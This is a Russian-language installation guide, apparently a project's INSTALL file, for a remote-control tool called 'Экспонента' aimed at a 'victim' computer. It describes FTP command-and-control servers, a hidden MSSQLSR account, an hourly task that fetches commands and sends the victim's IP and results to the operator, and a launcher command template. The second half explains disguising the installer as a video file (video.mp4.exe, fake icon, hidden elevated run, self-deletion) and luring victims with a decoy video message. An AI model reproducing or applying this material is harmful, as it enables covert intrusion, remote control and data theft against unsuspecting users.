<h1 id="инсталляция-стайлера-экспонента">Инсталляция стайлера «Экспонента»</h1>
<p>В данном каталоге содержатся дистрибутивы, необходимые для установки стайлера. Все дистрибутивы рабочие, но пока не тестировались.</p>
<h2 id="принцип-работы-программы">Принцип работы программы</h2>
<p>После инсталляции файлов стайлера в системном окружении операционной системы появляются следующие переменные:</p>
<ul>
<li><em>Hacker_User</em> – имя (логин) учётной записи компьютера-жертвы на ftp серверах хозяина, с которых будет осуществляться управление стайлером</li>
<li><em>Hacker_Pass</em> – пароль для этой учётной записи. Его нужно указывать, чтобы посторонние не имели доступа к данным жертвы на сервере хозяина. Внимание! Пароль храниться в незащищённом виде! Просто автор не нашёл способа безопасного использования хеша и солей в программах коммуникации.</li>
<li><em>Hacker_host1</em> – доменное имя публичного хоста, с которого скачивается установочные файлы и публичные обновления стайлера. Её значение может совпадать со значением следующей переменной, когда используется только один хост.</li>
<li><em>Hacker_host2</em> – доменное имя приватного хоста, с которого скачиваются в офлайн-режиме команды управления стайлером и на который передаются результаты его работы</li>
</ul>
<p>Также создаётся учётная запись с именем MSSQLSR для возможного удалённого подключения к компьютеру, а также добавляется задание для текущего пользователя на запуск каждый час файла onsysload, в котором находятся текущие команды управления стайлером.</p>
<p>На приватном хосте создаются аккаунты пользователя-жертвы FTP сервера. В корень этого сервера будут «сваливаться» результаты работы стайлера на компьютере-жертве, а в папке Private будут расположены командные файлы, загружаемые на компьютер-жертву для управления им.</p>
<p>Рабочая директория стайлера для компьютера-жертвы – c:\pub1\Util</p>
<p>При входе в аккаунт компьютера любого пользователя каждый час запускается на обработку файл onsysload. В нём присутствуют следующие обязательные части:</p>
<ul>
<li>ftp загрузка команд для исполнения команд на компьютере-жертве (например, новый файл user_hourly.bat или новый файл отправки данных)</li>
<li>Определение внешнего IP адреса компьютера в Интернете;</li>
<li>Переименование и отправка файла с IP адресом на сервер хозяина</li>
</ul>
<h2 id="исходные-данные">Исходные данные</h2>
<p>Для установки стайлера &quot;Экспонента&quot; вам дополнительно потребуется следующее рабочее окружение:</p>
<ul>
<li>FTP адрес публичного хостинга файлов стайлера. Он выбирается достаточно произвольно, главное — чтобы он предоставлял анонимный доступ. Хотя программисты могут изменить это условие. Доменное имя этого публичного хостинга указывается в переменной Hacker_host1.</li>
<li>FTP адрес (хостинг, логин и пароль) — для управления компьютером жертвы. Создавать этот адрес необходимо согласно указанным выше принципам работы стайлера, включая иерархию каталогов и круглосуточную доступность сервиса.</li>
</ul>
<p>Исходя из вышесказанного, определитесь, нужно ли Вам редактировать командные файлы этого проекта, или всё оставить с настройками по умолчанию. Если исправления Вам всё-таки нужны, внесите изменения в клон данного проекта и пересоберите SFX файлы установки дистрибутива.</p>
<h2 id="организация-ftp-сервера-hacker_host1">Организация FTP сервера Hacker_host1</h2>
<p>На FTP сервере с доменным именем, сохранённой в переменной Hacker_host1, в его корне должна создана папка: &quot;Exponenta&quot;. В ней должны содержаться основной установщик стайлера, установщики плагинов и SFX архивы с инсталляторами. Учтите, что все файлы, расположенные в этом каталоге, будут скачены с сервера на компьютер жертвы без каких-либо изменений! Это значит, что там должны располагаться только универсальные файлы, а кастомизация для каждого пользователя должны проводиться отдельно при подготовке инсталлятора.</p>
<p>Основным файлом, который устанавливает стайлер вместе с модулями и плагинами, является файл: InstallMainExponenta.bat Его пример приведён в этой папке. Этот файл рабочий, и может использоваться для локальной установки стайлера путём запуска этого файла из командной строки с повышенными привилегиями. Для своей работы этот файл (в текущей редакции) требует наличие в том же каталоге файлов:</p>
<ul>
<li>MainExponenta.SFX.exe с основными файлами стайлера;</li>
<li>Hidden_Start.SFX.exe с плагином-пакетом Hidden Start;</li>
<li>Elevation.SFX.exe с плагином-пакетом Elevation;</li>
<li>chock.install.cmd – командный файл с инсталлятором пакета Chocolatey for Windows;</li>
<li>choc_pack.install.cmd – командный файл с инсталляцией дополнительных программ через менеджер пакетов;</li>
<li>Register_HS.bat – командный файл регистрации плагина «Hidden_Start»;</li>
<li>Register_El.bat – командный файл регистрации плагина «Elevation»;</li>
</ul>
<p>Это минимальный рабочий набор инсталлятора. Он обязательно должен присутствовать в каталоге Exponenta на сервере. Назначение других дополнительных файлов будет написано ниже.</p>
<p>В этом же каталоге присутствуют файлы descript.ion, README.MD, INSTALL.MD, install1.md, install.rtf и install.html. Они несут только информационную нагрузку, и для работы стайлера не требуются.</p>
<h2 id="организация-ftp-сервера-hacker_host2">Организация FTP сервера Hacker_host2</h2>
<p>FTP сервер с доменом Hacker_host2 является запароленным сервером, на котором должен обязательно присутствовать аккаунт с логином Hacker_User и паролем Hacker_Pass (здесь указаны имена переменных, вместо которых Вы должны использовать их корректные значения).</p>
<p>На этом сервере, в его корне, обязательно должна присутствовать папка Private, в которой будут храниться файлы, с помощью которых ежечасно выдаются на исполнение команды стайлера, выполняемые им офлайне. В качестве обязательных, в этом наборе должны присутствовать файлы:</p>
<ul>
<li>user_hourly1.bat;</li>
<li>user_dayly1.bat;</li>
<li>user_onstart1.bat;</li>
<li>sendfile.cmd,</li>
<li>и обязательно должен <em>отсутствовать</em> файл <strong>onsysload.bat</strong>!</li>
</ul>
<p>Результаты выполнения команд стайлер пересылает при помощи файла sendfile.cmd на сервер Hacker_host2 в корневой каталог аккаунта Hacker_User. Будьте внимательны, этот каталог должен быть <em>открыт для записи</em> авторизованному пользователю ftp-сервера по этому протоколу!</p>
<p><em>Примечание</em>. Хотя на одном хосте может располагаться управление более чем одним стайлером, сочетание Hacker_User/Hacker_host2 должно быть уникальным для всего Интернета! Без этого условия стайлер работать не будет.</p>
<h1 id="создание-дистрибутива-для-распространения-методом-социальной-инженерии">Создание дистрибутива для распространения методом социальной инженерии</h1>
<p>Устанавливать файлы стайлера локально или через удалённый доступ — не очень хорошая идея со всех сторон. Поскольку пакет для своей работы требует Интернет, то и устанавливаться он должен также из Интернета. Ниже будет рассказано, как подготовить файл для загрузки пакета из Интернета и сокрытия установки методами социальной инженерии.</p>
<h2 id="подготовка-установочного-файла">Подготовка установочного файла</h2>
<p>Для «нормальной» установки стайлера в этом каталоге присутствуют файлы:</p>
<ul>
<li>load_distrib.bat — общий для всех файл, скачивающий и устанавливающий файлы дистрибутива стайлера «Экспонента»;</li>
<li>load.bat — пример кастомизированного под конкретную жертву файл загрузки стайлера.</li>
</ul>
<p>Назначение первого файла — это открытие портов для FTP клиента, подготовки файла сценария и скачивание дистрибутива этим клиентом, а также запуск локального установщика стайлера. Данные для этого пакетный файл получает из командной строки.</p>
<p>Единственное назначение второго файла — это запуск первого файла с заполненными по умолчанию параметрами кастомизации. Дело в том, что запустить файл из Интернета с параметрами Вам будет затруднительно, а с использованием методов социальной инженерии — практически невозможно. Только для этого и создан этот файл.</p>
<p>Формат этого файла следующий</p>
<pre><code>Echo off
start load_distrib.bat «значение переменной Hacker_User» «значение переменной Hacker_Pass» «значение переменной Hacker_host1» «значение переменной Hacker_host2»
</code></pre>
<p>Теперь для запуска процесса инсталляции необходимо, чтобы оба файла находились в одном каталоге, и нужно будет только запустить файл load.bat с повышенными привилегиями. Один из вариантов, как это сделать на практике, смотри ниже.</p>
<h2 id="подготовка-файла-для-пересылки-на-компьютер-жертвы">Подготовка файла для пересылки на компьютер жертвы</h2>
<p>Подготовленные таким образом файлы позволяют установить стайлер в любой конфигурации на компьютер жертвы. Для этого достаточно запустить файл <code>load.bat</code> (или как Вы его назвали) на компьютере жертвы из любого каталога с повышенными привилегиями выполнения. Всё бы хорошо… Только переслать файл с таким расширением на компьютер жертвы будет проблематично, а запустить такой файл с повышенными привилегиями, в реальных условиях пользователю будет практически невозможно. Администратора такой файл насторожит, а многие лузеры вообще не умеют запускать командные файлы.</p>
<p>К счастью для хакеров, есть программа для конверсии командных файлов в обычные исполняемые файлы с расширением *.exe. Для её установки необходимо подать команду:</p>
<pre><code>choco install –y battoexeconverter
</code></pre>
<p>После установки необходимо запустить программу, открыть в её собственном редакторе командный файл, задать опции конвертирования, конечный каталог, и, бинго, будет создан исполняемый файл с той же функциональностью.</p>
<p>Перечислять все опции и команды работы этого конвертера автор не будет – это тема отдельной статьи. Нужно отметить, что данный файл после конвертации сможет:</p>
<ol>
<li>Требовать своего запуска с повышенными привилегиями;</li>
<li>Инкапсулировать в себя не только выполняемый командный файл, но и дополнительные командные и исполняемые файлы, архивы, видео, изображения, необходимые для его работы;</li>
<li>Сменить иконку приложения, отображаемую в Windows и файловых менеджерах. Это позволит скрывать факт присутствия исполняемого файла в стайлере и позволяет файлу установщика стайлера «Экспонента» «притвориться», например, изображением или файлом видео;</li>
<li>Передавать указанный файл по ссылкам в социальных сетях или мессенджерах, а также электронной почте и других средствах обмена сообщениями между пользователями. Принципиальный момент здесь «по ссылке», поскольку многие программы обмена сообщениями не разрешают пересылать в своём теле командные и исполняемые файлы, как раз для предотвращения заражения. А переданный по ссылке командный файл нельзя ни скачать, ни запустить;</li>
<li>Назначить файлу установщика любое имя, например, video.mp4.exe. Как правило, по умолчанию Microsoft Windows скрывает окончания исполняемых файлов. В этом случае, при соблюдении пункта 3, этот файл будет похож на файл видео, например, с танцующими свиньями, и лузер может просто не заметить подмену. Особенно, если в дополнение к стайлеру ему действительно будет скачено и показано видео с танцующими свиньями.</li>
<li>Иметь любые размеры. Исполняемые файлы, конвертированные из командных, в зависимости от своего содержимого могут быть или очень маленькими, или очень большими, если инкапсулирует в себе видео. В любом случае небольшой размер файла не предполагает большого места на диске, и у пользователя или администратора создаётся ложное впечатление, что такая маленькая команда не сможет принести сколь-нибудь существенного вреда и не содержит в себе установщика. Что, на самом деле, не так;</li>
<li>Запускать установку в скрытом режиме, не показывая окна консоли;</li>
<li>Удалять после себя все файлы, которые были инкапсулированы в этот исполняемый файл;</li>
<li>Назначать любой рабочий каталог для выполнения, в том числе каталог с временными файлами. В этом случае обнаружить его работу будет ещё труднее.</li>
</ol>
<p>Таким образом, преобразовав командный файл установщика стайлера в исполняемый файл, его можно будет переслать жертве по ссылке вместе с побуждающим текстом: «Ну ка оцени, какое видео с танцующими свиньями я откопал!». По законам социальной инженерии, весьма вероятно откроет такое видео не только офисный лузер, но и его коллега – беспечный администратор. Не смотря на все предупреждения специалистов охраны и компьютерной безопасности. А нам то и надо!</p>
<p>А организовать загрузку и запуск видео для «отвода глаз» Вам не составит труда. Например, с помощью команд:</p>
<pre><code>Wget «ссылка на файл с видео»
Start «файл видео»
</code></pre>
<p>Все эти команды присутствуют в базовом пакете стайлера.</p>
